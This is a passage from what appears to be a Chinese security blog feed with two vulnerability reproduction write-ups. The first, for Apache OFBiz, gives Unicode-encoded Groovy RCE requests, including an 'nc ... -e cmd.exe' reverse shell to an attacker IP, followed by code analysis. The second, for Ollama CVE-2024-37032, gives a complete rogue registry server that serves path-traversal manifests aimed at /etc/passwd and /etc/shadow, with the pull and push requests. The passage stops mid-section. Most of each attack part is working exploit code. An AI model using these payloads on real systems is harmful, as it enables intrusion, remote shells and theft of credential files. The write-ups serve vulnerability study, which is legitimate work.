src="1723778315152-3f7a724e-b81a-4d5e-a732-4304e1ec4e93.png" alt="img"></p><p><img src="1723778290042-3e967b7c-03fc-4f70-a770-3ba54c6acc69.png" alt="img"></p><p>运行</p><p><img src="1723778021673-7463b12e-344e-48e8-ae49-364949a67a66.png" alt="img"></p><p>访问<a href="https://192.168.56.1:8443/webtools/control/main/">https://192.168.56.1:8443/webtools/control/main/</a></p><p><img src="1723778562839-9076fab3-048d-4f6d-8de6-3a48a9cc6919.png" alt="img"></p><h2 id="0x05漏洞复现"><a href="#0x05漏洞复现" class="headerlink" title="0x05漏洞复现"></a>0x05漏洞复现</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs plain">POST /webtools/control/main/ProgramExport HTTP/1.1<br>Host: 192.168.56.1:8443<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36<br>Content-Type: application/x-www-form-urlencoded<br>Content-Length: 272<br><br>groovyProgram=\u0074\u0068\u0072\u006f\u0077\u0020\u006e\u0065\u0077\u0020\u0045\u0078\u0063\u0065\u0070\u0074\u0069\u006f\u006e\u0028\u0027\u0063\u0061\u006c\u0063\u0027\u002e\u0065\u0078\u0065\u0063\u0075\u0074\u0065\u0028\u0029\u002e\u0074\u0065\u0078\u0074\u0029\u003b<br></code></pre></td></tr></table></figure><p>POST  groovyProgram&#x3D;throw new Exception(‘calc’.execute().text);</p><p><img src="1723779159143-34962278-a711-44fa-8a7a-0c3c60407b82.png" alt="img"></p><p><strong>反弹shell操作</strong></p><p>攻击机打开nc端口</p><p><img src="1723779800857-8e61b660-df58-43f6-9e17-3a6f1cf824cd.png" alt="img"></p><p>payload（throw new Exception(‘nc 192.168.244.133 4444 -e cmd.exe’.execute().text); ） unicode加密</p><p><a href="https://www.toolscat.com/decode/unicode">Unicode在线加解密——开发者在线工具,工具猫 (toolscat.com)</a></p><p><img src="1723781350586-a65ef352-82fd-40b3-8735-267bef4cd1de.png" alt="img"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs plain">POST /webtools/control/main/ProgramExport HTTP/1.1<br>Host: 192.168.56.1:8443<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36<br>Content-Type: application/x-www-form-urlencoded<br>Content-Length: 458<br><br>groovyProgram=\u0074\u0068\u0072\u006f\u0077\u0020\u006e\u0065\u0077\u0020\u0045\u0078\u0063\u0065\u0070\u0074\u0069\u006f\u006e\u0028\u0027\u006e\u0063\u0020\u0031\u0039\u0032\u002e\u0031\u0036\u0038\u002e\u0032\u0034\u0034\u002e\u0031\u0033\u0033\u0020\u0034\u0034\u0034\u0034\u0020\u002d\u0065\u0020\u0063\u006d\u0064\u002e\u0065\u0078\u0065\u0027\u002e\u0065\u0078\u0065\u0063\u0075\u0074\u0065\u0028\u0029\u002e\u0074\u0065\u0078\u0074\u0029\u003b\u0020<br></code></pre></td></tr></table></figure><p>成功反弹到shell</p><p><img src="1723781293606-3bdfef9c-562b-40d8-8972-29891a8899bc.png" alt="img"></p><h2 id="0x06漏洞分析"><a href="#0x06漏洞分析" class="headerlink" title="0x06漏洞分析"></a>0x06漏洞分析</h2><p>org.apache.ofbiz.webapp.control.ControlServlet类会处理所有以&#x2F;control&#x2F;开头的URL请求。在其类中doPost和doGet方法对环境进行相应的初始化，并调用RequestHandler的doRequest()方法处理请求。</p><p><img src="1723827269691-6fc9c138-0ef2-4b1d-9515-ae73ea49ad02.png" alt="img"></p><p><img src="1723827269691-6fc9c138-0ef2-4b1d-9515-ae73ea49ad02.png" alt="img"></p><p><img src="1724033732509-16164b53-32a3-4ad4-b21c-2cbb61da2878.png" alt="img"></p><p>requestUri获取了路由配置，再往下看请求  <code>&quot;main&quot;</code> 对应的请求映射集合，并作出处理请求的安全认证。overrideViewUri用于实现视图渲染，查看view类型操作。</p><p><img src="1723794941823-2d90c37c-7f41-493e-a301-c09275236b73.png" alt="img"></p><p><img src="1723986889714-8d2cb4ac-e75f-46c0-ab8b-a937eaaf1d6c.png" alt="img"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs plain">if (&quot;view&quot;.equals(nextRequestResponse.type)) &#123;<br>  if (Debug.verboseOn()) Debug.logVerbose(&quot;[RequestHandler.doRequest]: Response is a view.&quot; + showSessionId(request), module);<br>                // check for an override view, only used if &quot;success&quot; = eventReturn<br>       String viewName = (UtilValidate.isNotEmpty(overrideViewUri) &amp;&amp; (eventReturn == null || &quot;success&quot;.equals(eventReturn))) ? overrideViewUri : nextRequestResponse.value;<br>       renderView(viewName, requestMap.securityExternalView, request, response, saveName);<br>       &#125; <br></code></pre></td></tr></table></figure><p>viewName的值会有三种情况：</p><ul><li>如果 overrideViewUri 不为空，并且 eventReturn 为空或者等于 “success”，则 viewName 的值为 overrideViewUri。</li><li>如果 overrideViewUri 为空，并且 eventReturn 不为空且不等于 “success”，则 viewName 的值为 nextRequestResponse.value。</li><li>如果两个条件都不满足，即 overrideViewUri 为空且 eventReturn 为空或者不等于 “success”，则 viewName 的值为 nextRequestResponse.value。</li></ul><p>为了达到漏洞利用，首先需要需要requestUri所认定的不鉴权且路由为view类型，调用viewName的值为overrideViewUri，也就是达成条件overrideViewUri存在，而且事件返回为success。</p><p><img src="1723988790516-5078869e-99d4-487c-a765-f3d4cdc6e300.png" alt="img"></p><p>查看webapp&#x2F;webtools&#x2F;WEB-INF&#x2F;controller.xml mian符合上述所说情况</p><p><img src="1724032610300-9c8174d4-be34-498c-8e97-ad3a7db8bab9.png" alt="img"></p><p>其次就是找到如何进行rce的利用了，在widget&#x2F;EntityScreens.xml中的ProgramExport，尝试解析执行&#x2F;webtools&#x2F;groovyScripts&#x2F;entity&#x2F;ProgramExport.groovy，并且groovyProgram可控。</p><p><img src="1724033539673-19d775fb-d762-425a-b349-8d3cd9776854.png" alt="img"></p><p>因此整个漏洞的思路就是，在requestUri选择一个可以绕过验证的路由，返回类型为success，为此达到renderView实现带有可利用路由的overrideViewUri。</p><h2 id="0x07修复方案"><a href="#0x07修复方案" class="headerlink" title="0x07修复方案"></a>0x07修复方案</h2><p>Apache OFBiz &gt;&#x3D; 18.12.15</p><h2 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h2><p><a href="https://forum.butian.net/article/524">https://forum.butian.net/article/524</a></p><p><a href="https://www.secrss.com/articles/68838">https://www.secrss.com/articles/68838</a></p><p><a href="https://cn-sec.com/archives/3037801.html">https://cn-sec.com/archives/3037801.html</a></p>]]></content>
    
    
    <categories>
      
      <category>漏洞复现</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Apache</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CVE-2024-37032 Ollama远程代码执行漏洞</title>
    <link href="/2025/03/21/Ollama%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9ECVE-2024-37032/"/>
    <url>/2025/03/21/Ollama%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9ECVE-2024-37032/</url>
    
    <content type="html"><![CDATA[<h2 id="0x01简介"><a href="#0x01简介" class="headerlink" title="0x01简介"></a>0x01简介</h2><p>Ollama是一个专为在本地环境中运行和定制大型语言模型而设计的工具。它提供了一个简单高效的接口，用于创建、运行和管理这些模型，同时还提供了一个丰富的预构建模型库，可以轻松集成到各种应用程序中。Ollama的目标是使大型语言模型的部署和交互变得简单，无论是对于开发者还是对于终端用户。</p><h2 id="0x02-漏洞概述"><a href="#0x02-漏洞概述" class="headerlink" title="0x02 漏洞概述"></a>0x02 漏洞概述</h2><p><strong>漏洞编号：CVE-2024-37032</strong> 该漏洞允许通过路径遍历任意写入文件。digest字段的验证不正确，服务器错误地将有效负载解释为合法的文件路径，攻击者可在digest字段中包含路径遍历payload的恶意清单文件，利用该漏洞实现任意文件读取&#x2F;写入或导致远程代码执行。</p><h2 id="0x03-影响版本"><a href="#0x03-影响版本" class="headerlink" title="0x03 影响版本"></a>0x03 影响版本</h2><p>Ollama &lt; 0.1.34</p><h2 id="0x04-环境搭建"><a href="#0x04-环境搭建" class="headerlink" title="0x04 环境搭建"></a>0x04 环境搭建</h2><p>在docker里面设置&#x2F;etc&#x2F;docker&#x2F;daemon.json文件，可供拉取国外镜像（没有可新建）</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs prolog">&#123;<br>  <span class="hljs-string">&quot;registry-mirrors&quot;</span>: [<br>    <span class="hljs-string">&quot;https://registry.docker-cn.com&quot;</span>,<br>    <span class="hljs-string">&quot;http://hub-mirror.c.163.com&quot;</span>,<br>    <span class="hljs-string">&quot;https://dockerhub.azk8s.cn&quot;</span>,<br>    <span class="hljs-string">&quot;https://mirror.ccs.tencentyun.com&quot;</span>,<br>    <span class="hljs-string">&quot;https://registry.cn-hangzhou.aliyuncs.com&quot;</span>,<br>    <span class="hljs-string">&quot;https://docker.mirrors.ustc.edu.cn&quot;</span>,<br>    <span class="hljs-string">&quot;https://docker.m.daocloud.io&quot;</span>,   <br>    <span class="hljs-string">&quot;https://noohub.ru&quot;</span>, <br>    <span class="hljs-string">&quot;https://huecker.io&quot;</span>,<br>    <span class="hljs-string">&quot;https://dockerhub.timeweb.cloud&quot;</span> <br>  ]<br>&#125;<br><br></code></pre></td></tr></table></figure><p>拉取docker镜像</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">docker</span> run -v ollama:/root/.ollama -p <span class="hljs-number">11434</span>:<span class="hljs-number">11434</span> --name ollama ollama/ollama:<span class="hljs-number">0</span>.<span class="hljs-number">1</span>.<span class="hljs-number">33</span><br></code></pre></td></tr></table></figure><p><img src="88e2b8b9a870b9508e5f6292e9d413c3.png" alt="image.png"></p><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动">编辑</p><p>进行访问测试</p><p><img src="c3374eb3fbbbc61f5d9df606d8932742.png" alt="image.png"></p><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动">编辑</p><h2 id="0x05-漏洞复现"><a href="#0x05-漏洞复现" class="headerlink" title="0x05 漏洞复现"></a>0x05 漏洞复现</h2><p>查看&#x2F;etc&#x2F;passwd</p><p><img src="dfd6b74e10199dd05ef4379b93ca9139.png" alt="image.png"></p><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动">编辑</p><p>git clone exp</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">git <span class="hljs-keyword">clone</span> <span class="hljs-title">https</span>://github.com/Bi0x/CVE-<span class="hljs-number">2024</span>-<span class="hljs-number">37032</span>.git<br></code></pre></td></tr></table></figure><p>在poc.py和server.py中的host变量和target_url和host变量，修改为目标ip，运行server.py后运行poc.py，读取&#x2F;etc&#x2F;passwd文件</p><p>通过模拟Ollama请求，构造一个恶意模型。在digest字段设置路径穿越payload，代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> fastapi <span class="hljs-keyword">import</span> FastAPI, Request, Response<br><br>HOST = <span class="hljs-string">&quot;192.168.244.133&quot;</span><br>app = FastAPI()<br><br><span class="hljs-meta">@app.get(<span class="hljs-params"><span class="hljs-string">&quot;/&quot;</span></span>)</span><br><span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">index_get</span>():<br>    <span class="hljs-keyword">return</span> &#123;<span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">&quot;Hello rogue server&quot;</span>&#125;<br><br><span class="hljs-meta">@app.post(<span class="hljs-params"><span class="hljs-string">&quot;/&quot;</span></span>)</span><br><span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">index_post</span>(<span class="hljs-params">callback_data: Request</span>):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-keyword">await</span> callback_data.body())<br>    <span class="hljs-keyword">return</span> &#123;<span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">&quot;Hello rogue server&quot;</span>&#125;<br><br><span class="hljs-comment"># for ollama pull</span><br><span class="hljs-meta">@app.get(<span class="hljs-params"><span class="hljs-string">&quot;/v2/rogue/bi0x/manifests/latest&quot;</span></span>)</span><br><span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">fake_manifests</span>():<br>    <span class="hljs-keyword">return</span> &#123;<span class="hljs-string">&quot;schemaVersion&quot;</span>:<span class="hljs-number">2</span>,<span class="hljs-string">&quot;mediaType&quot;</span>:<span class="hljs-string">&quot;application/vnd.docker.distribution.manifest.v2+json&quot;</span>,<span class="hljs-string">&quot;config&quot;</span>:&#123;<span class="hljs-string">&quot;mediaType&quot;</span>:<span class="hljs-string">&quot;application/vnd.docker.container.image.v1+json&quot;</span>,<span class="hljs-string">&quot;digest&quot;</span>:<span class="hljs-string">&quot;../../../../../../../../../../../../../etc/shadow&quot;</span>,<span class="hljs-string">&quot;size&quot;</span>:<span class="hljs-number">10</span>&#125;,<span class="hljs-string">&quot;layers&quot;</span>:[&#123;<span class="hljs-string">&quot;mediaType&quot;</span>:<span class="hljs-string">&quot;application/vnd.ollama.image.license&quot;</span>,<span class="hljs-string">&quot;digest&quot;</span>:<span class="hljs-string">&quot;../../../../../../../../../../../../../../../../../../../tmp/notfoundfile&quot;</span>,<span class="hljs-string">&quot;size&quot;</span>:<span class="hljs-number">10</span>&#125;,&#123;<span class="hljs-string">&quot;mediaType&quot;</span>:<span class="hljs-string">&quot;application/vnd.docker.distribution.manifest.v2+json&quot;</span>,<span class="hljs-string">&quot;digest&quot;</span>:<span class="hljs-string">&quot;../../../../../../../../../../../../../etc/passwd&quot;</span>,<span class="hljs-string">&quot;size&quot;</span>:<span class="hljs-number">10</span>&#125;,&#123;<span class="hljs-string">&quot;mediaType&quot;</span>:<span class="hljs-string">&quot;application/vnd.ollama.image.license&quot;</span>,<span class="hljs-string">&quot;digest&quot;</span>:<span class="hljs-string">f&quot;../../../../../../../../../../../../../../../../../../../root/.ollama/models/manifests/<span class="hljs-subst">&#123;HOST&#125;</span>/rogue/bi0x/latest&quot;</span>,<span class="hljs-string">&quot;size&quot;</span>:<span class="hljs-number">10</span>&#125;]&#125;<br><br><span class="hljs-meta">@app.head(<span class="hljs-params"><span class="hljs-string">&quot;/etc/passwd&quot;</span></span>)</span><br><span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">fake_passwd_head</span>(<span class="hljs-params">response: Response</span>):<br>    response.headers[<span class="hljs-string">&quot;Docker-Content-Digest&quot;</span>] = <span class="hljs-string">&quot;../../../../../../../../../../../../../etc/passwd&quot;</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#x27;</span><br><br><span class="hljs-meta">@app.get(<span class="hljs-params"><span class="hljs-string">&quot;/etc/passwd&quot;</span>, status_code=<span class="hljs-number">206</span></span>)</span><br><span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">fake_passwd_get</span>(<span class="hljs-params">response: Response</span>):<br>    response.headers[<span class="hljs-string">&quot;Docker-Content-Digest&quot;</span>] = <span class="hljs-string">&quot;../../../../../../../../../../../../../etc/passwd&quot;</span><br>    response.headers[<span class="hljs-string">&quot;E-Tag&quot;</span>] = <span class="hljs-string">&quot;\&quot;../../../../../../../../../../../../../etc/passwd\&quot;&quot;</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;cve-2024-37032-test&#x27;</span><br><br><span class="hljs-meta">@app.head(<span class="hljs-params"><span class="hljs-string">f&quot;/root/.ollama/models/manifests/<span class="hljs-subst">&#123;HOST&#125;</span>/rogue/bi0x/latest&quot;</span></span>)</span><br><span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">fake_latest_head</span>(<span class="hljs-params">response: Response</span>):<br>    response.headers[<span class="hljs-string">&quot;Docker-Content-Digest&quot;</span>] = <span class="hljs-string">&quot;../../../../../../../../../../../../../root/.ollama/models/manifests/dev-lan.bi0x.com/rogue/bi0x/latest&quot;</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#x27;</span><br><br><span class="hljs-meta">@app.get(<span class="hljs-params"><span class="hljs-string">f&quot;/root/.ollama/models/manifests/<span class="hljs-subst">&#123;HOST&#125;</span>/rogue/bi0x/latest&quot;</span>, status_code=<span class="hljs-number">206</span></span>)</span><br><span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">fake_latest_get</span>(<span class="hljs-params">response: Response</span>):<br>    response.headers[<span class="hljs-string">&quot;Docker-Content-Digest&quot;</span>] = <span class="hljs-string">&quot;../../../../../../../../../../../../../root/.ollama/models/manifests/dev-lan.bi0x.com/rogue/bi0x/latest&quot;</span><br>    response.headers[<span class="hljs-string">&quot;E-Tag&quot;</span>] = <span class="hljs-string">&quot;\&quot;../../../../../../../../../../../../../root/.ollama/models/manifests/dev-lan.bi0x.com/rogue/bi0x/latest\&quot;&quot;</span><br>    <span class="hljs-keyword">return</span> &#123;<span class="hljs-string">&quot;schemaVersion&quot;</span>:<span class="hljs-number">2</span>,<span class="hljs-string">&quot;mediaType&quot;</span>:<span class="hljs-string">&quot;application/vnd.docker.distribution.manifest.v2+json&quot;</span>,<span class="hljs-string">&quot;config&quot;</span>:&#123;<span class="hljs-string">&quot;mediaType&quot;</span>:<span class="hljs-string">&quot;application/vnd.docker.container.image.v1+json&quot;</span>,<span class="hljs-string">&quot;digest&quot;</span>:<span class="hljs-string">&quot;../../../../../../../../../../../../../etc/shadow&quot;</span>,<span class="hljs-string">&quot;size&quot;</span>:<span class="hljs-number">10</span>&#125;,<span class="hljs-string">&quot;layers&quot;</span>:[&#123;<span class="hljs-string">&quot;mediaType&quot;</span>:<span class="hljs-string">&quot;application/vnd.ollama.image.license&quot;</span>,<span class="hljs-string">&quot;digest&quot;</span>:<span class="hljs-string">&quot;../../../../../../../../../../../../../../../../../../../tmp/notfoundfile&quot;</span>,<span class="hljs-string">&quot;size&quot;</span>:<span class="hljs-number">10</span>&#125;,&#123;<span class="hljs-string">&quot;mediaType&quot;</span>:<span class="hljs-string">&quot;application/vnd.ollama.image.license&quot;</span>,<span class="hljs-string">&quot;digest&quot;</span>:<span class="hljs-string">&quot;../../../../../../../../../../../../../etc/passwd&quot;</span>,<span class="hljs-string">&quot;size&quot;</span>:<span class="hljs-number">10</span>&#125;,&#123;<span class="hljs-string">&quot;mediaType&quot;</span>:<span class="hljs-string">&quot;application/vnd.ollama.image.license&quot;</span>,<span class="hljs-string">&quot;digest&quot;</span>:<span class="hljs-string">f&quot;../../../../../../../../../../../../../../../../../../../root/.ollama/models/manifests/<span class="hljs-subst">&#123;HOST&#125;</span>/rogue/bi0x/latest&quot;</span>,<span class="hljs-string">&quot;size&quot;</span>:<span class="hljs-number">10</span>&#125;]&#125;<br><br><span class="hljs-meta">@app.head(<span class="hljs-params"><span class="hljs-string">&quot;/tmp/notfoundfile&quot;</span></span>)</span><br><span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">fake_notfound_head</span>(<span class="hljs-params">response: Response</span>):<br>    response.headers[<span class="hljs-string">&quot;Docker-Content-Digest&quot;</span>] = <span class="hljs-string">&quot;../../../../../../../../../../../../../tmp/notfoundfile&quot;</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#x27;</span><br><br><span class="hljs-meta">@app.get(<span class="hljs-params"><span class="hljs-string">&quot;/tmp/notfoundfile&quot;</span>, status_code=<span class="hljs-number">206</span></span>)</span><br><span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">fake_notfound_get</span>(<span class="hljs-params">response: Response</span>):<br>    response.headers[<span class="hljs-string">&quot;Docker-Content-Digest&quot;</span>] = <span class="hljs-string">&quot;../../../../../../../../../../../../../tmp/notfoundfile&quot;</span><br>    response.headers[<span class="hljs-string">&quot;E-Tag&quot;</span>] = <span class="hljs-string">&quot;\&quot;../../../../../../../../../../../../../tmp/notfoundfile\&quot;&quot;</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;cve-2024-37032-test&#x27;</span><br><br><span class="hljs-comment"># for ollama push</span><br><span class="hljs-meta">@app.post(<span class="hljs-params"><span class="hljs-string">&quot;/v2/rogue/bi0x/blobs/uploads/&quot;</span>, status_code=<span class="hljs-number">202</span></span>)</span><br><span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">fake_upload_post</span>(<span class="hljs-params">callback_data: Request, response: Response</span>):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-keyword">await</span> callback_data.body())<br>    response.headers[<span class="hljs-string">&quot;Docker-Upload-Uuid&quot;</span>] = <span class="hljs-string">&quot;3647298c-9588-4dd2-9bbe-0539533d2d04&quot;</span><br>    response.headers[<span class="hljs-string">&quot;Location&quot;</span>] = <span class="hljs-string">f&quot;http://<span class="hljs-subst">&#123;HOST&#125;</span>/v2/rogue/bi0x/blobs/uploads/3647298c-9588-4dd2-9bbe-0539533d2d04?_state=eBQ2_sxwOJVy8DZMYYZ8wA8NBrJjmdINFUMM6uEZyYF7Ik5hbWUiOiJyb2d1ZS9sbGFtYTMiLCJVVUlEIjoiMzY0NzI5OGMtOTU4OC00ZGQyLTliYmUtMDUzOTUzM2QyZDA0IiwiT2Zmc2V0IjowLCJTdGFydGVkQXQiOiIyMDI0LTA2LTI1VDEzOjAxOjExLjU5MTkyMzgxMVoifQ%3D%3D&quot;</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#x27;</span><br><br><span class="hljs-meta">@app.patch(<span class="hljs-params"><span class="hljs-string">&quot;/v2/rogue/bi0x/blobs/uploads/3647298c-9588-4dd2-9bbe-0539533d2d04&quot;</span>, status_code=<span class="hljs-number">202</span></span>)</span><br><span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">fake_patch_file</span>(<span class="hljs-params">callback_data: Request</span>):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;patch&#x27;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-keyword">await</span> callback_data.body())<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#x27;</span><br><br><span class="hljs-meta">@app.post(<span class="hljs-params"><span class="hljs-string">&quot;/v2/rogue/bi0x/blobs/uploads/3647298c-9588-4dd2-9bbe-0539533d2d04&quot;</span>, status_code=<span class="hljs-number">202</span></span>)</span><br><span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">fake_post_file</span>(<span class="hljs-params">callback_data: Request</span>):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-keyword">await</span> callback_data.body())<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#x27;</span><br><br><span class="hljs-meta">@app.put(<span class="hljs-params"><span class="hljs-string">&quot;/v2/rogue/bi0x/manifests/latest&quot;</span></span>)</span><br><span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">fake_manifests_put</span>(<span class="hljs-params">callback_data: Request, response: Response</span>):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-keyword">await</span> callback_data.body())<br>    response.headers[<span class="hljs-string">&quot;Docker-Upload-Uuid&quot;</span>] = <span class="hljs-string">&quot;3647298c-9588-4dd2-9bbe-0539533d2d04&quot;</span><br>    response.headers[<span class="hljs-string">&quot;Location&quot;</span>] = <span class="hljs-string">f&quot;http://<span class="hljs-subst">&#123;HOST&#125;</span>/v2/rogue/bi0x/blobs/uploads/3647298c-9588-4dd2-9bbe-0539533d2d04?_state=eBQ2_sxwOJVy8DZMYYZ8wA8NBrJjmdINFUMM6uEZyYF7Ik5hbWUiOiJyb2d1ZS9sbGFtYTMiLCJVVUlEIjoiMzY0NzI5OGMtOTU4OC00ZGQyLTliYmUtMDUzOTUzM2QyZDA0IiwiT2Zmc2V0IjowLCJTdGFydGVkQXQiOiIyMDI0LTA2LTI1VDEzOjAxOjExLjU5MTkyMzgxMVoifQ%3D%3D&quot;</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#x27;</span><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    <span class="hljs-keyword">import</span> uvicorn<br>    uvicorn.run(app, host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, port=<span class="hljs-number">80</span>)<br><br></code></pre></td></tr></table></figure><p><img src="68ccd9d23700aa52ac433579c36174bb.png" alt="image.png"></p><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动">编辑</p><p>&#x2F;api&#x2F;pull端点将恶意模型载入</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/api/pull</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>192.168.244.133:11434<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/json<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>54<br><br><span class="language-json"><span class="hljs-punctuation">&#123;</span></span><br><span class="language-json">  <span class="hljs-attr">&quot;name&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;192.168.244.133/rogue/bi0x&quot;</span><span class="hljs-punctuation">,</span></span><br><span class="language-json">  <span class="hljs-attr">&quot;insecure&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span></span><br><span class="language-json"><span class="hljs-punctuation">&#125;</span></span><br><span class="language-json"></span><br></code></pre></td></tr></table></figure><p><img src="548168df19018805a3c7bf88f73150c4.png" alt="image.png"></p><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动">编辑</p><p>通过&#x2F;api&#x2F;push端点将此恶意模型推送到远程注册表，服务器将处理构造的manifest文件。</p><figure class="highlight 